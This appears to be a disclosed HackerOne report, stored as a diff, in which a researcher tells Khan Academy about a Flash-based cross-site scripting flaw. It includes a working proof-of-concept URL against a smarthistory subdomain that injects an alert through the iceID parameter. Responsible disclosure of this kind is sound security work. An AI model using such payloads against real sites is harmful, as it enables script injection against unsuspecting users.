@@ -1,0 +1,19 @@
+ReportLink:https://hackerone.com/reports/6575
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/prakharprasad
+ReportedTo:Khan Academy(khanacademy)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:09.04.2014 4:33:45
+
+Summary:
+
+Hi,
+
+There is a SWF-based XSS : http://smarthistory.khanacademy.org/assets/flash/cozimo.swf?iceID=\%22%29%29}catch%28e%29{alert%28%27XSS%27%29;}//
+
+Opening the link would trigger JavaScript execution! Works in possibly any browser with **Adobe Flash, i.e - Chrome, Firefox**
+
+
+Thanks!
